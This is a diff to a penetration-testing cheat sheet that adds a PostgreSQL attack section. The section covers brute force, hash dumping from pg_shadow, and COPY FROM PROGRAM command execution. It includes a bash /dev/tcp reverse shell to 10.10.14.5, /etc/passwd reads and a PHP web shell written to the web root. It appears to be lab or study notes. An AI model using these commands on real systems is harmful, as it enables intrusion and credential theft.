@@ -1,6 +1,6 @@
 # Attacking Common Services
 
-#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #NFS #SNMP #WinRM #DNS #Email #Enumeration #BruteForce
+#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #PostgreSQL #NFS #SNMP #WinRM #DNS #Email #Enumeration #BruteForce
 
 ## What is this?
 
@@ -27,6 +27,7 @@ Per-service playbook — enumeration, anonymous/null access, brute force, exploi
 | [[Tools/Database/mssqlclient\|impacket-mssqlclient]] | MSSQL | Interactive MSSQL client |
 | [[Tools/Database/sqsh\|sqsh]] | MSSQL, MySQL | CLI DB client (Linux) |
 | [[Tools/Database/redis-cli\|redis-cli]] | Redis | Interactive Redis client |
+| [[Tools/Database/psql\|psql]] | PostgreSQL | Interactive PostgreSQL client (`COPY … FROM PROGRAM` RCE) |
 | `ldapsearch` | LDAP | LDAP query tool (OpenLDAP client) |
 | [[Tools/AD/ldapdomaindump\|ldapdomaindump]] | LDAP | AD LDAP dump → HTML/JSON |
 | [[Tools/AD/windapsearch\|windapsearch]] | LDAP | AD-targeted LDAP queries |
@@ -629,9 +630,80 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 
 ```bash
 hydra -L users.txt -P passwords.txt mysql://10.10.10.10
-crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt    # works for MySQL too in some CME builds
 medusa -u root -P passwords.txt -h 10.10.10.10 -M mysql
+nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.10
+# NB: NetExec/CME has NO mysql protocol (only mssql) — don't reach for `nxc mysql`, it doesn't exist
 ```
+
+---
+
+## PostgreSQL — TCP 5432
+
+### Enumeration
+
+```bash
+nmap -sV -sC -p 5432 10.10.10.10
+nmap -p 5432 --script pgsql-brute 10.10.10.10
+```
+
+### Connect
+
+```bash
+# psql (Linux client, pkg postgresql-client). Default db & superuser are both "postgres"
+psql -h 10.10.10.10 -U postgres -d postgres                       # prompts for password
+PGPASSWORD='Password123' psql -h 10.10.10.10 -U postgres          # non-interactive
+psql "postgresql://postgres:Password123@10.10.10.10:5432/postgres" # URI form
+
+# Metasploit
+use auxiliary/scanner/postgres/postgres_login
+```
+
+### Enumeration Queries
+
+```sql
+\l                         -- list databases   (SQL: SELECT datname FROM pg_database;)
+\c dbname                  -- connect to a database
+\dt                        -- list tables      (SQL: SELECT table_name FROM information_schema.tables;)
+\du                        -- list roles/users
+SELECT version();
+SELECT current_user, session_user;
+SHOW is_superuser;                              -- 'on' = you can RCE / read files below
+SELECT usename, passwd FROM pg_shadow;          -- superuser: dump md5/SCRAM password hashes
+```
+
+### Command Execution — COPY FROM PROGRAM (CVE-2019-9193)
+
+A superuser (or a role in `pg_execute_server_program`) runs OS commands as the **postgres** service account — "a feature, not a bug"; works on PostgreSQL 9.3+:
+
+```sql
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';           -- executes as the postgres OS user
+SELECT * FROM cmd_exec;                     -- read the captured output
+-- reverse shell one-liner:
+COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.5/4444 0>&1''';
+```
+
+### File Read / Write
+
+```sql
+-- Read a local file (superuser)
+CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;
+-- large-object alternative
+SELECT lo_import('/etc/passwd', 1337); SELECT lo_get(1337);
+
+-- Write a web shell into a writable web root
+COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+```
+
+### Brute Force
+
+```bash
+hydra -L users.txt -P passwords.txt postgres://10.10.10.10
+medusa -U users.txt -P passwords.txt -h 10.10.10.10 -M postgres
+```
+
+> [!tip] `COPY … FROM PROGRAM` needs superuser or the `pg_execute_server_program` role — check `SHOW is_superuser;` first. Not superuser? Look for `dblink`/FDW to pivot to another instance, or crack the `pg_shadow` hashes offline (PG md5 = `md5(password+username)`, hashcat **`-m 12`**; SCRAM-SHA-256 on PG 10+ = **`-m 28600`**).
 
 ---
 
@@ -968,6 +1040,7 @@ use post/multi/gather/vnc_password_file
 | MSRPC | 135 | TCP |
 | MSSQL | 1433 | TCP |
 | MySQL | 3306 | TCP |
+| PostgreSQL | 5432 | TCP |
 | RDP | 3389 | TCP |
 | NFS | 2049 | TCP/UDP |
 | WinRM | 5985, 5986 | TCP |
@@ -989,6 +1062,7 @@ use post/multi/gather/vnc_password_file
 | WinRM | `crackmapexec winrm <ip> -u users.txt -p pass.txt` |
 | MSSQL | `crackmapexec mssql <ip> -u users.txt -p pass.txt` |
 | MySQL | `hydra -L users.txt -P pass.txt mysql://<ip>` |
+| PostgreSQL | `hydra -L users.txt -P pass.txt postgres://<ip>` |
 | SMTP | `hydra -L users.txt -P pass.txt smtp://<ip>` |
 | SNMP | `onesixtyone -c community-strings.txt <ip>` |
 | VNC | `hydra -P pass.txt vnc://<ip>` |
@@ -998,5 +1072,5 @@ use post/multi/gather/vnc_password_file
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-30*
+*Updated: 2026-09-01*
 *Model: claude-opus-4-8*
